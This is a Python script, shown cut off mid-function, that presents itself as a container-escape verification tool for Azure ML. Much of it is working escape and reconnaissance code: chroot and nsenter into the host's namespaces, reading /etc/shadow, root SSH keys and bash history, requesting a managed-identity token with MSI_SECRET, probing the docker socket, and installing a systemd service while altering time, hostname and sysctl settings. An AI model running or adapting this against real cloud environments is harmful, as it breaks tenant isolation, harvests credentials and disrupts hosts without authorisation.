#!/usr/bin/env python3
"""
Azure ML Container Escape Comprehensive Verification Script

This script performs a series of tests to definitively determine whether a container
escape has occurred or if the environment is still within container boundaries.
"""

import os
import sys
import uuid
import json
import socket
import platform
import subprocess
import datetime
import time
import shutil
import hashlib
import tempfile
from pathlib import Path
import re

class ContainerEscapeVerifier:
    def __init__(self):
        self.results = {
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "hostname": socket.gethostname(),
            "platform_info": self._get_platform_info(),
            "tests": {},
            "conclusion": {},
        }
        # Generate unique identifiers for this test run
        self.marker_id = str(uuid.uuid4())
        self.run_id = hashlib.md5(self.marker_id.encode()).hexdigest()[:10]
        
    def _get_platform_info(self):
        """Collect basic platform information."""
        return {
            "system": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
        }

    def _run_command(self, cmd, shell=False):
        """Run a command and return its output."""
        try:
            if isinstance(cmd, str) and not shell:
                cmd = cmd.split()
            result = subprocess.run(
                cmd, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                text=True, 
                shell=shell,
                timeout=30  # Add timeout to prevent hanging
            )
            return {
                "returncode": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "success": result.returncode == 0
            }
        except Exception as e:
            return {
                "returncode": -1,
                "stdout": "",
                "stderr": str(e),
                "success": False
            }

    def test_process_namespace(self):
        """
        Test the process namespace to see if we can access processes outside our container.
        A true escape would show host processes outside the container's PID namespace.
        """
        print("[+] Testing process namespace isolation...")
        
        # Get all processes
        ps_result = self._run_command("ps -ef")
        
        # Check for containerization indicators in process list
        container_processes = [
            "containerd", "dockerd", "docker-containerd", "kubelet", 
            "containerd-shim", "docker-proxy", "containerd-shim-runc"
        ]
        
        container_parent_indicators = []
        for proc in container_processes:
            if proc in ps_result["stdout"]:
                container_parent_indicators.append(proc)
        
        # Get the init process (PID 1)
        init_process = self._run_command("cat /proc/1/cmdline")
        init_name = init_process["stdout"].replace("\x00", " ").strip()
        
        # Check if PID 1 is a container init or a system init
        typical_host_init = ["systemd", "init", "/sbin/init", "/lib/systemd/systemd"]
        is_likely_host_init = any(init in init_name for init in typical_host_init)
        
        # Check PID count - containers typically have fewer processes
        pid_count = len(ps_result["stdout"].splitlines()) - 1  # Subtract header line
        
        # Get PPID 0 processes (should only exist on the host)
        ppid_0_procs = self._run_command("ps -eo pid,ppid,cmd | grep ' 0 '")
        has_ppid_0 = ppid_0_procs["success"] and ppid_0_procs["stdout"].strip() != ""
        
        test_result = {
            "init_process": init_name,
            "pid_count": pid_count,
            "container_parent_indicators": container_parent_indicators,
            "has_processes_with_ppid_0": has_ppid_0,
            "appears_to_be_host": is_likely_host_init and has_ppid_0,
            "raw_ps_output_sample": ps_result["stdout"][:1000] if ps_result["success"] else "Failed to get process list"
        }
        
        self.results["tests"]["process_namespace"] = test_result
        return test_result
    
    def test_filesystem_namespace(self):
        """
        Test the filesystem namespace to check for true host access.
        Create files in different locations and verify accessibility.
        """
        print("[+] Testing filesystem namespace isolation...")
        
        test_locations = [
            "/tmp",
            "/var/tmp",
            "/dev/shm",
            "/proc/sys",
            "/sys/kernel",
            "/etc"
        ]
        
        results = {}
        for location in test_locations:
            if not os.path.exists(location):
                results[location] = {"exists": False, "writable": False, "marker_test": "location does not exist"}
                continue
                
            test_file = os.path.join(location, f"fs_test_{self.run_id}.txt")
            try:
                # Try to write to the location
                with open(test_file, "w") as f:
                    f.write(f"Test marker: {self.marker_id}\n")
                writable = True
                
                # If successful, try to read it back and then remove it
                with open(test_file, "r") as f:
                    content = f.read().strip()
                
                marker_verified = f"Test marker: {self.marker_id}" == content
                
                try:
                    os.unlink(test_file)
                    cleanup = "success"
                except:
                    cleanup = "failed"
                
                results[location] = {
                    "exists": True,
                    "writable": writable,
                    "marker_test": "success" if marker_verified else "failed",
                    "cleanup": cleanup
                }
                
            except Exception as e:
                results[location] = {
                    "exists": True,
                    "writable": False,
                    "marker_test": f"error: {str(e)}",
                    "cleanup": "n/a"
                }
        
        # Special test for /proc/1/root - often used in escape attempts
        proc1_accessible = os.access("/proc/1/root", os.R_OK)
        proc1_listable = False
        proc1_contents = []
        
        if proc1_accessible:
            try:
                proc1_contents = os.listdir("/proc/1/root")
                proc1_listable = True
            except:
                pass
                
        results["/proc/1/root"] = {
            "exists": os.path.exists("/proc/1/root"),
            "accessible": proc1_accessible,
            "listable": proc1_listable,
            "content_sample": proc1_contents[:10] if proc1_listable else []
        }
        
        # Test sensitive file access
        sensitive_files = [
            "/etc/shadow",
            "/etc/sudoers",
            "/etc/ssh/sshd_config",
            "/root/.ssh/authorized_keys",
            "/root/.bash_history",
            "/var/lib/docker/containers",
            "/var/log/auth.log"
        ]
        
        file_access = {}
        for sf in sensitive_files:
            if os.path.exists(sf):
                try:
                    with open(sf, "r") as f:
                        content = f.read(500)  # Read first 500 chars only
                    file_access[sf] = {"exists": True, "readable": True, "content_sample": content[:100]}
                except:
                    file_access[sf] = {"exists": True, "readable": False}
            else:
                file_access[sf] = {"exists": False, "readable": False}
        
        results["sensitive_file_access"] = file_access
        
        self.results["tests"]["filesystem_namespace"] = results
        return results
    
    def test_network_namespace(self):
        """
        Test network namespace to see if we have host-level network visibility.
        """
        print("[+] Testing network namespace isolation...")
        
        # Check interfaces
        interfaces = self._run_command("ip addr show")
        
        # Check for common host-only interfaces
        host_interfaces = ["docker0", "veth", "cni", "flannel", "calico", "bond", "tun", "wg"]
        found_host_interfaces = []
        
        for iface in host_interfaces:
            if iface in interfaces["stdout"]:
                found_host_interfaces.append(iface)
        
        # Get routing table
        routes = self._run_command("ip route")
        
        # Check open ports
        netstat = self._run_command("ss -tulpn")
        
        # Check for docker socket - a common escape target
        docker_socket_exists = os.path.exists("/var/run/docker.sock")
        
        # Test outbound connectivity to verify we're not in a restricted network namespace
        connectivity = {}
        for dest in ["8.8.8.8", "1.1.1.1", "azure.microsoft.com"]:
            try:
                # Use subprocess with timeout to prevent hanging
                ping_result = self._run_command(f"ping -c 1 -W 2 {dest}")
                connectivity[dest] = ping_result["success"]
            except:
                connectivity[dest] = False
                
        # Get listening ports from the host perspective
        listening_ports = []
        if netstat["success"]:
            for line in netstat["stdout"].splitlines():
                if "LISTEN" in line:
                    listening_ports.append(line)
                    
        results = {
            "found_host_interfaces": found_host_interfaces,
            "docker_socket_exists": docker_socket_exists,
            "outbound_connectivity": connectivity,
            "raw_interfaces": interfaces["stdout"][:1000] if interfaces["success"] else "Failed to get interfaces",
            "raw_routes": routes["stdout"][:1000] if routes["success"] else "Failed to get routes",
            "listening_ports_sample": listening_ports[:10]
        }
        
        # Attempt to access Kubernetes API if available
        k8s_api = self._run_command("curl -s https://kubernetes.default.svc -k")
        results["kubernetes_api_accessible"] = k8s_api["success"] and "kubernetes" in k8s_api["stdout"].lower()
        
        # Test for container runtime sockets
        runtime_sockets = [
            "/var/run/docker.sock",
            "/run/containerd/containerd.sock",
            "/var/run/crio/crio.sock",
            "/var/run/dockershim.sock"
        ]
        
        socket_access = {}
        for sock in runtime_sockets:
            if os.path.exists(sock):
                # Try to use the socket with a basic command
                if sock == "/var/run/docker.sock":
                    cmd = "curl -s --unix-socket /var/run/docker.sock http://localhost/info"
                    result = self._run_command(cmd)
                    socket_access[sock] = {
                        "exists": True,
                        "accessible": result["success"],
                        "response_sample": result["stdout"][:100] if result["success"] else result["stderr"]
                    }
                else:
                    socket_access[sock] = {"exists": True, "accessible": "test not implemented"}
            else:
                socket_access[sock] = {"exists": False, "accessible": False}
                
        results["container_runtime_sockets"] = socket_access
        
        self.results["tests"]["network_namespace"] = results
        return results
    
    def test_capability_boundaries(self):
        """
        Test capability boundaries to check for privileged operations.
        """
        print("[+] Testing capability boundaries...")
        
        # Check current capabilities
        capabilities = self._run_command("capsh --print")
        
        # Test various privileged operations
        test_operations = {
            "mount_new_fs": self._run_command("mount -t tmpfs none /mnt", shell=True),
            "create_device": self._run_command("mknod /dev/testdev c 1 1", shell=True),
            "load_kernel_module": self._run_command("modprobe -l", shell=True),
            "change_system_time": self._run_command("date -s '2001-01-01'", shell=True),
            "reboot_command": self._run_command("reboot --help", shell=True),  # Just check help to avoid actual reboot
            "set_hostname": self._run_command(f"hostname test-{self.run_id}", shell=True)
        }
        
        # Check if we can modify system settings
        sysctl_tests = {}
        for param in ["kernel.hostname", "net.ipv4.ip_forward", "kernel.unprivileged_userns_clone"]:
            cmd = f"sysctl -w {param}=1"
            result = self._run_command(cmd, shell=True)
            sysctl_tests[param] = result["success"]
            
        # See if we can access /sys/kernel directly
        kernel_params = {}
        syskernel = "/sys/kernel"
        if os.path.exists(syskernel) and os.access(syskernel, os.R_OK):
            try:
                params = os.listdir(syskernel)
                kernel_params["accessible"] = True
                kernel_params["params"] = params[:10]  # First 10 items only
            except:
                kernel_params["accessible"] = False
        else:
            kernel_params["accessible"] = False
            
        # Check systemd access - a strong indicator of host access
        systemd_tests = {
            "systemctl_accessible": self._run_command("systemctl list-units --type=service", shell=True)["success"],
            "systemd_detect_virt": self._run_command("systemd-detect-virt", shell=True),
            "can_create_service": False
        }
        
        # Try to actually create a systemd service - the ultimate test of host access
        # Only do this if systemctl is accessible to avoid unnecessary attempts
        if systemd_tests["systemctl_accessible"]:
            test_service = f"""[Unit]
Description=Container Escape Test Service {self.run_id}

[Service]
Type=simple
ExecStart=/bin/echo "Container escape test {self.marker_id}"
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
"""
            service_path = f"/etc/systemd/system/container-escape-test-{self.run_id}.service"
            
            try:
                with open(service_path, "w") as f:
                    f.write(test_service)
                
                # Try to enable and start the service
                enable_cmd = f"systemctl enable container-escape-test-{self.run_id}.service"
                enable_result = self._run_command(enable_cmd, shell=True)
                
                # Only try to start if enable succeeded
                if enable_result["success"]:
                    start_cmd = f"systemctl start container-escape-test-{self.run_id}.service"
                    start_result = self._run_command(start_cmd, shell=True)
                    
                    # Check if it's actually running
                    status_cmd = f"systemctl status container-escape-test-{self.run_id}.service"
                    status_result = self._run_command(status_cmd, shell=True)
                    
                    systemd_tests["can_create_service"] = start_result["success"]
                    systemd_tests["service_status"] = status_result["stdout"]
                    
                    # Try to clean up regardless of success/failure
                    self._run_command(f"systemctl disable container-escape-test-{self.run_id}.service", shell=True)
                    self._run_command(f"systemctl stop container-escape-test-{self.run_id}.service", shell=True)
                    try:
                        os.unlink(service_path)
                    except:
                        pass
            except Exception as e:
                systemd_tests["service_creation_error"] = str(e)
            
        results = {
            "raw_capabilities": capabilities["stdout"] if capabilities["success"] else "Failed to get capabilities",
            "privileged_operations": test_operations,
            "sysctl_modifications": sysctl_tests,
            "kernel_params": kernel_params,
            "systemd_access": systemd_tests
        }
        
        # Get security features that might be limiting us
        apparmor = self._run_command("cat /proc/self/attr/current")
        selinux = self._run_command("getenforce")
        seccomp = self._run_command("grep Seccomp /proc/self/status")
        
        results["security_context"] = {
            "apparmor": apparmor["stdout"].strip() if apparmor["success"] else "Not available",
            "selinux": selinux["stdout"].strip() if selinux["success"] else "Not available",
            "seccomp": seccomp["stdout"].strip() if seccomp["success"] else "Not available"
        }
        
        self.results["tests"]["capability_boundaries"] = results
        return results
        
    def test_cgroup_namespace(self):
        """
        Test cgroup namespace to determine if we're in a container or host.
        """
        print("[+] Testing cgroup namespace...")
        
        # Check our cgroups
        cgroups = self._run_command("cat /proc/self/cgroup")
        
        # Look for container identifiers in cgroups
        container_indicators = ["docker", "containerd", "kubepods", ".scope", "container"]
        found_indicators = []
        
        if cgroups["success"]:
            for indicator in container_indicators:
                if indicator in cgroups["stdout"]:
                    found_indicators.append(indicator)
        
        # Try to check parent cgroups if we have access
        parent_cgroups_accessible = False
        parent_cgroups = ""
        
        try:
            # Get our parent process
            ppid = os.getppid()
            parent_cgroup_file = f"/proc/{ppid}/cgroup"
            
            if os.path.exists(parent_cgroup_file) and os.access(parent_cgroup_file, os.R_OK):
                with open(parent_cgroup_file, "r") as f:
                    parent_cgroups = f.read()
                parent_cgroups_accessible = True
        except:
            pass
            
        # Compare with host cgroups
        host_cgroups_match = False
        host_cgroups = ""
        
        try:
            # Try to access what should be a host process's cgroups
            if os.path.exists("/proc/1/cgroup") and os.access("/proc/1/cgroup", os.R_OK):
                with open("/proc/1/cgroup", "r") as f:
                    host_cgroups = f.read()
                
                # Compare our cgroups with "host" cgroups
                # In a container, these should differ
                if cgroups["success"]:
                    host_cgroups_match = host_cgroups == cgroups["stdout"]
        except:
            pass
            
        # Check if we can write to the cgroup filesystem
        cgroup_writeable = False
        cgroup_write_test = ""
        
        if os.path.exists("/sys/fs/cgroup"):
            test_locations = [
                "/sys/fs/cgroup/memory/memory.limit_in_bytes",
                "/sys/fs/cgroup/cpu/cpu.shares",
                "/sys/fs/cgroup/pids/pids.max"
            ]
            
            for loc in test_locations:
                if os.path.exists(loc):
                    try:
                        # Try to read the current value
                        with open(loc, "r") as f:
                            current_value = f.read().strip()
                            
                        # Try to write the same value back (shouldn't change anything but tests writeability)
                        with open(loc, "w") as f:
                            f.write(current_value)
                            
                        cgroup_writeable = True
                        cgroup_write_test = loc
                        break
                    except:
                        pass
        
        results = {
            "container_indicators_in_cgroups": found_indicators,
            "parent_cgroups_accessible": parent_cgroups_accessible,
            "parent_cgroups": parent_cgroups[:1000] if parent_cgroups_accessible else "",
            "host_cgroups_match": host_cgroups_match,
            "can_write_to_cgroups": cgroup_writeable,
            "cgroup_write_test_location": cgroup_write_test,
            "raw_cgroups": cgroups["stdout"] if cgroups["success"] else "Failed to get cgroups",
            "raw_host_cgroups": host_cgroups[:1000]
        }
        
        self.results["tests"]["cgroup_namespace"] = results
        return results
    
    def test_azure_ml_specific(self):
        """
        Test Azure ML specific indicators and security boundaries.
        """
        print("[+] Testing Azure ML specific indicators...")
        
        # Check for Azure ML environment variables
        azureml_env_vars = {}
        for env_var in os.environ:
            if "AZUREML" in env_var or "AML" in env_var or "AZURE" in env_var:
                azureml_env_vars[env_var] = os.environ[env_var]
                
        # Look for typical Azure ML paths
        azureml_paths = []
        potential_paths = [
            "/mnt/azureml",
            "/var/azureml",
            "/opt/azureml",
            "/mnt/batch/tasks",
            "/mnt/resource",
            "/mnt/projects"
        ]
        
        for path in potential_paths:
            if os.path.exists(path):
                azureml_paths.append(path)
                
                # Get first level of subdirectories
                try:
                    subdirs = [os.path.join(path, d) for d in os.listdir(path)]
                    azureml_paths.extend([s for s in subdirs if os.path.isdir(s)][:5])  # Limit to first 5
                except:
                    pass
        
        # Check for access to Azure instance metadata service
        imds_access = self._run_command(
            "curl -s -H Metadata:true http://169.254.169.254/metadata/instance?api-version=2021-01-01",
            shell=True
        )
        
        # Check for MSI (Managed Service Identity) access
        msi_access = None
        if "MSI_ENDPOINT" in os.environ and "MSI_SECRET" in os.environ:
            msi_cmd = f"curl -s {os.environ['MSI_ENDPOINT']}?resource=https://management.azure.com/ -H Secret:{os.environ['MSI_SECRET']}"
            msi_access = self._run_command(msi_cmd, shell=True)
            
        # Look for Azure config files or credentials
        azure_config_locations = [
            "/home/azureuser/.azure",
            "/root/.azure",
            "/var/lib/waagent",
            "~/.azure"
        ]
        
        azure_configs = {}
        for loc in azure_config_locations:
            expanded_path = os.path.expanduser(loc)
            if os.path.exists(expanded_path):
                try:
                    files = os.listdir(expanded_path)
                    azure_configs[loc] = files
                except:
                    azure_configs[loc] = "Access denied"
            else:
                azure_configs[loc] = "Does not exist"
                
        # Check if we're in a VM or container definitively
        is_vm_indicators = []
        
        # Check for VM specific files/directories
        vm_indicators = [
            "/var/lib/waagent",
            "/var/lib/cloud",
            "/var/log/azure",
            "/etc/waagent.conf",
            "/var/lib/hyperv"
        ]
        
        for indicator in vm_indicators:
            if os.path.exists(indicator):
                is_vm_indicators.append(indicator)
                
        # Check dmesg for VM evidence
        dmesg = self._run_command("dmesg | grep -i azure")
        if dmesg["success"] and dmesg["stdout"].strip():
            is_vm_indicators.append("dmesg_azure_references")
            
        # Check if we can access Azure IMDS
        if imds_access["success"] and "azure" in imds_access["stdout"].lower():
            is_vm_indicators.append("imds_accessible")
            
        results = {
            "azureml_env_vars_count": len(azureml_env_vars),
            "azureml_env_vars_keys": list(azureml_env_vars.keys()),
            "azureml_env_var_samples": {k: azureml_env_vars[k] for k in list(azureml_env_vars.keys())[:5]},
            "azureml_paths": azureml_paths,
            "imds_accessible": imds_access["success"] and "azure" in imds_access["stdout"].lower(),
            "imds_response": imds_access["stdout"][:1000] if imds_access["success"] else "Failed to access IMDS",
            "msi_accessible": msi_access["success"] if msi_access else "MSI endpoints not found in environment",
            "azure_configs": azure_configs,
            "is_vm_indicators": is_vm_indicators
        }
        
        # Check for the ability to access other containers/VMs
        # Try to find evidence of other containers/VMs on the same host
        other_containers = []
        
        # Check /var/lib/docker/containers
        docker_containers_path = "/var/lib/docker/containers"
        if os.path.exists(docker_containers_path) and os.access(docker_containers_path, os.R_OK):
            try:
                container_dirs = os.listdir(docker_containers_path)
                other_containers.extend(container_dirs[:10])  # Get first 10 at most
                results["can_see_other_containers"] = True
            except:
                results["can_see_other_containers"] = False
        else:
            results["can_see_other_containers"] = False
            
        results["other_containers"] = other_containers
            
        self.results["tests"]["azure_ml_specific"] = results
        return results
        
    def run_bidirectional_marker_test(self):
        """
        Run a more comprehensive bidirectional marker test that would definitively prove
        a container escape by creating files in both contexts and verifying them.
        """
        print("[+] Running bidirectional marker test...")
        
        # First perspective (presumed container)
        container_marker = f"container-marker-{self.run_id}"
        container_content = f"Container marker content: {self.marker_id}"
        container_path = f"/tmp/{container_marker}"
        
        # Second perspective (presumed host via chroot)
        host_marker = f"host-marker-{self.run_id}" 
        host_content = f"Host marker content: {self.marker_id}"
        host_path = f"/tmp/{host_marker}"
        
        # Additional paths to test as "host-only"
        host_only_paths = [
            "/var/lib",
            "/etc/systemd",
            "/opt",
            "/root"
        ]
        
        # Create marker in container context
        try:
            with open(container_path, "w") as f:
                f.write(container_content)
            container_marker_created = True
        except:
            container_marker_created = False
            
        # Try to perform a "chroot escape" to access the "host"
        chroot_escape_cmd = f"""
        mkdir -p /tmp/escape-{self.run_id}/mnt
        mount -t tmpfs none /tmp/escape-{self.run_id}/mnt
        chroot /proc/1/root /bin/sh -c "echo '{host_content}' > {host_path}"
        """
        
        chroot_attempt = self._run_command(chroot_escape_cmd, shell=True)
        
        # Try a different chroot escape method if the first fails
        if not chroot_attempt["success"]:
            alt_chroot_cmd = f"chroot /proc/1/root /bin/sh -c \"echo '{host_content}' > {host_path}\""
            chroot_attempt = self._run_command(alt_chroot_cmd, shell=True)
            
        # Check if we can read the markers from both contexts
        container_from_host = None
        host_from_container = None
        
        # Check if we can see the "container" marker from the "host" perspective
        if os.path.exists(container_path):
            container_from_host_cmd = f"chroot /proc/1/root cat {container_path}"
            container_from_host = self._run_command(container_from_host_cmd, shell=True)
            
        # Check if we can see the "host" marker from the "container" perspective
        if os.path.exists(host_path):
            host_from_container_content = None
            try:
                with open(host_path, "r") as f:
                    host_from_container_content = f.read()
                host_from_container = {
                    "success": True,
                    "stdout": host_from_container_content
                }
            except:
                host_from_container = {
                    "success": False,
                    "stdout": "",
                    "stderr": "Failed to read host marker from container context"
                }
                
        # Attempt to create and read markers in "host-only" locations
        host_only_markers = {}
        for path in host_only_paths:
            if not os.path.exists(path):
                host_only_markers[path] = {"exists": False}
                continue
                
            test_file = os.path.join(path, f"host-only-{self.run_id}.txt")
            
            # Try direct access first
            direct_access = None
            try:
                with open(test_file, "w") as f:
                    f.write(f"Direct access marker: {self.marker_id}")
                direct_access = {"success": True}
            except Exception as e:
                direct_access = {"success": False, "error": str(e)}
                
            # Try through "chroot escape"
            chroot_access_cmd = f"chroot /proc/1/root /bin/sh -c \"echo 'Chroot access marker: {self.marker_id}' > {test_file}\""
            chroot_access = self._run_command(chroot_access_cmd, shell=True)
            
            # Check if either method worked
            file_exists = os.path.exists(test_file)
            
            # Read the file back if it exists
            file_content = None
            if file_exists:
                try:
                    with open(test_file, "r") as f:
                        file_content = f.read()
                except Exception as e:
                    file_content = f"Error reading: {str(e)}"
                    
                # Try to clean up
                try:
                    os.unlink(test_file)
                except:
                    pass
                    
            host_only_markers[path] = {
                "exists": os.path.exists(path),
                "direct_access": direct_access,
                "chroot_access": chroot_access["success"],
                "file_created": file_exists,
                "file_content": file_content
            }
            
        # Clean up the container and host markers
        try:
            if os.path.exists(container_path):
                os.unlink(container_path)
            if os.path.exists(host_path):
                os.unlink(host_path)
        except:
            pass
            
        results = {
            "container_marker": {
                "path": container_path,
                "created": container_marker_created,
                "content": container_content
            },
            "host_marker": {
                "path": host_path,
                "chroot_attempt_success": chroot_attempt["success"],
                "chroot_attempt_output": chroot_attempt["stdout"] if chroot_attempt["success"] else chroot_attempt["stderr"],
                "exists": os.path.exists(host_path)
            },
            "cross_context_visibility": {
                "container_from_host_visible": container_from_host["success"] if container_from_host else False,
                "container_from_host_content": container_from_host["stdout"] if container_from_host and container_from_host["success"] else None,
                "host_from_container_visible": host_from_container["success"] if host_from_container else False,
                "host_from_container_content": host_from_container["stdout"] if host_from_container and host_from_container["success"] else None,
            },
            "host_only_markers": host_only_markers
        }
        
        # Add analysis of the cross-context visibility
        if results["cross_context_visibility"]["container_from_host_visible"] and results["cross_context_visibility"]["host_from_container_visible"]:
            # Check if the contents match what we wrote
            container_content_match = results["cross_context_visibility"]["container_from_host_content"] == container_content
            host_content_match = results["cross_context_visibility"]["host_from_container_content"] == host_content
            
            cross_context_same_view = container_content_match and host_content_match
            
            results["cross_context_analysis"] = {
                "container_content_match": container_content_match,
                "host_content_match": host_content_match,
                "cross_context_same_view": cross_context_same_view,
                "consistent_with_escape": cross_context_same_view,
                "consistent_with_single_namespace": cross_context_same_view  # Same result suggests single namespace
            }
        else:
            results["cross_context_analysis"] = {
                "container_content_match": False,
                "host_content_match": False,
                "cross_context_same_view": False,
                "consistent_with_escape": False,
                "consistent_with_single_namespace": True  # Different results suggest dual namespaces
            }
            
        self.results["tests"]["bidirectional_marker"] = results
        return results
    
    def test_gpu_access(self):
        """
        Test if we have access to GPUs as this can be a sign of privileged access.
        """
        print("[+] Testing GPU access...")
        
        # Check if nvidia-smi is available
        nvidia_smi = self._run_command("nvidia-smi")
        
        # Check for CUDA available through python
        cuda_python = self._run_command(
            "python3 -c \"import torch; print('CUDA available:', torch.cuda.is_available())\"",
            shell=True
        )
        
        # Check for device files
        gpu_devices = []
        for dev in ["/dev/nvidia0", "/dev/nvidiactl", "/dev/nvidia-uvm"]:
            if os.path.exists(dev):
                gpu_devices.append(dev)
                
        results = {
            "nvidia_smi_available": nvidia_smi["success"],
            "nvidia_smi_output": nvidia_smi["stdout"][:1000] if nvidia_smi["success"] else nvidia_smi["stderr"],
            "cuda_python_check": cuda_python["stdout"] if cuda_python["success"] else "Failed or not installed",
            "gpu_device_files": gpu_devices
        }
        
        self.results["tests"]["gpu_access"] = results
        return results
    
    def test_runtime_environment_drift(self):
        """
        Test for environment drift that might indicate a container escape
        or demonstrate shared view.
        """
        print("[+] Testing for runtime environment drift...")
        
        # Create baseline marker for the current environment
        start_marker = f"env-start-{self.run_id}"
        start_path = f"/tmp/{start_marker}"
        
        try:
            with open(start_path, "w") as f:
                f.write(f"Environment marker: {self.marker_id}")
            start_marker_created = True
        except:
            start_marker_created = False
        
        # Get some environment measurements at the start
        start_env = {
            "hostname": socket.gethostname(),
            "uptime": self._run_command("cat /proc/uptime").get("stdout", ""),
            "kernel_modules": len(self._run_command("lsmod").get("stdout", "").splitlines()) - 1,
            "process_count": len(self._run_command("ps -ef").get("stdout", "").splitlines()) - 1,
            "load_avg": os.getloadavg() if hasattr(os, "getloadavg") else None,
            "marker_file": start_path,
            "marker_exists": os.path.exists(start_path)
        }
        
        # Attempt a "container escape"
        print("  [*] Attempting simulated container escape...")
        
        # Method 1: chroot
        chroot_cmd = """
        mkdir -p /tmp/escape-dir/mnt 2>/dev/null
        mount -t tmpfs none /tmp/escape-dir/mnt 2>/dev/null
        chroot /proc/1/root /bin/sh -c "echo 'Escaped' > /tmp/escape-successful"
        """
        self._run_command(chroot_cmd, shell=True)
        
        # Method 2: unshare
        unshare_cmd = """
        unshare -m bash -c "mount -t proc proc /proc && hostname escaped-host" 2>/dev/null
        """
        self._run_command(unshare_cmd, shell=True)
        
        # Method 3: nsenter
        nsenter_cmd = """
        nsenter --mount=/proc/1/ns/mnt --uts=/proc/1/ns/uts /bin/sh -c "echo 'Entered host namespaces' > /tmp/nsenter-successful" 2>/dev/null
        """
        self._run_command(nsenter_cmd, shell=True)
        
        # Get environment measurements after escape attempts
        end_env = {
            "hostname": socket.gethostname(),
            "uptime": self._run_command("cat /proc/uptime").get("stdout", ""),
            "kernel_modules": len(self._run_command("lsmod").get("stdout", "").splitlines()) - 1,
            "process_count": len(self._run_command("ps -ef").get("stdout", "").splitlines()) - 1,
            "load_avg": os.getloadavg() if hasattr(os, "getloadavg") else None,
            "marker_file": start_path,
            "marker_exists": os.path.exists(start_path)
        }
        
        # Check for markers created by escape attempts
        escape_markers = {
            "/tmp/escape-successful": os.path.exists("/tmp/escape-successful"),
            "/tmp/nsenter-successful": os.path.exists("/tmp/nsenter-successful")
        }
        
        # Compare environments
        env_differences = {}
        for key in start_env:
            if start_env[key] != end_env[key]:
                env_differences[key] = {
                    "before": start_env[key],
                    "after": end_env[key]
                }
        
        # Clean up
        for path in [start_path, "/tmp/escape-successful", "/tmp/nsenter-successful"]:
            if os.path.exists(path):
                try:
                    os.unlink(path)
                except:
                    pass
                    
        results = {
            "environment_before": start_env,
            "environment_after": end_env,
            "environment_differences": env_differences,
            "escape_markers": escape_markers
        }
        
        # Analysis of results
        if not env_differences and start_marker_created and start_env["marker_exists"] == end_env["marker_exists"]:
            results["analysis"] = "Environment appears stable, suggesting single namespace throughout testing"
        else:
            results["analysis"] = "Environment showed changes, suggesting possible namespace transitions"
            
        self.results["tests"]["runtime_drift"] = results
        return results
    
    def analyze_results(self):
        """
        Analyze all test results and draw conclusions.
        """
        print("[+] Analyzing results...")
        
        # Start with neutral conclusion
        conclusion = {
            "appears_to_be_escaped": None,
            "confidence": 0,
            "evidence_for_escape": [],
            "evidence_against_escape": [],
            "likely_scenario": "",
            "azure_ml_specific_notes": []
        }
        
        # Process network namespace results
        if "network_namespace" in self.results["tests"]:
            net_test = self.results["tests"]["network_namespace"]
            
            # Host-only interfaces visible?
            if net_test["found_host_interfaces"]:
                conclusion["evidence_for_escape"].append(
                    f"Can see host-only network interfaces: {', '.join(net_test['found_host_interfaces'])}"
                )
                
            # Container runtime sockets?
            for sock, details in net_test.get("container_runtime_sockets", {}).items():
                if details.get("exists") and details.get("accessible"):
                    conclusion["evidence_for_escape"].append(f"Can access container runtime socket: {sock}")
                    
            # Kubernetes API access?
            if net_test.get("kubernetes_api_accessible"):
                conclusion["evidence_for_escape"].append("Can access Kubernetes API server")
        
        # Process filesystem namespace results
        if "filesystem_namespace" in self.results["tests"]:
            fs_test = self.results["tests"]["filesystem_namespace"]
            
            # Can access /proc/1/root?
            if fs_test.get("/proc/1/root", {}).get("listable"):
                conclusion["evidence_for_escape"].append("Can list contents of /proc/1/root")
                
            # Sensitive file access?
            for file, details in fs_test.get("sensitive_file_access", {}).items():
                if details.get("readable"):
                    conclusion["evidence_for_escape"].append(f"Can read sensitive file: {file}")
        
        # Process capability boundary results
        if "capability_boundaries" in self.results["tests"]:
            cap_test = self.results["tests"]["capability_boundaries"]
            
            # Can create systemd services?
            if cap_test.get("systemd_access", {}).get("can_create_service"):
                conclusion["evidence_for_escape"].append("Can create and start systemd services")
                
            # Can modify system settings?
            any_sysctl = False
            for param, success in cap_test.get("sysctl_modifications", {}).items():
                if success:
                    any_sysctl = True
                    break
                    
            if any_sysctl:
                conclusion["evidence_for_escape"].append("Can modify sysctl parameters")
                
            # Kernel parameter access?
            if cap_test.get("kernel_params", {}).get("accessible"):
                conclusion["evidence_for_escape"].append("Can access kernel parameters directly")
        
        # Process process namespace results
        if "process_namespace" in self.results["tests"]:
            proc_test = self.results["tests"]["process_namespace"]
            
            # Does it look like we're on the host?
            if proc_test.get("appears_to_be_host"):
                conclusion["evidence_for_escape"].append("Process tree suggests host access (PID 1 is system init)")
                
            # Can we see processes with PPID 0?
            if proc_test.get("has_processes_with_ppid_0"):
                conclusion["evidence_for_escape"].append("Can see processes with PPID 0 (typically only visible on host)")
        
        # Process cgroup namespace results
        if "cgroup_namespace" in self.results["tests"]:
            cg_test = self.results["tests"]["cgroup_namespace"]
            
            # Container indicators in cgroups?
            if not cg_test.get("container_indicators_in_cgroups"):
                conclusion["evidence_for_escape"].append("No container indicators found in cgroups")
                
            # Cgroups match between "container" and "host"?
            if cg_test.get("host_cgroups_match"):
                conclusion["evidence_against_escape"].append("Cgroup paths are identical in both contexts, suggesting single environment")
                
            # Can write to cgroups?
            if cg_test.get("can_write_to_cgroups"):
                conclusion["evidence_for_escape"].append(f"Can write to cgroup controls: {cg_test.get('cgroup_write_test_location')}")
        
        # Process bidirectional marker test
        if "bidirectional_marker" in self.results["tests"]:
            marker_test = self.results["tests"]["bidirectional_marker"]
            
            # Cross-context visibility
            if marker_test.get("cross_context_analysis", {}).get("cross_context_same_view"):
                conclusion["evidence_against_escape"].append(
                    "Bidirectional marker test shows identical view in both contexts, suggesting shared namespace"
                )
            
            # Any host-only markers created?
            for path, details in marker_test.get("host_only_markers", {}).items():
                if details.get("file_created"):
                    if details.get("direct_access", {}).get("success") and not details.get("chroot_access"):
                        conclusion["evidence_against_escape"].append(
                            f"Could create marker in '{path}' directly but not via chroot, suggesting single namespace"
                        )
                    elif not details.get("direct_access", {}).get("success") and details.get("chroot_access"):
                        conclusion["evidence_for_escape"].append(
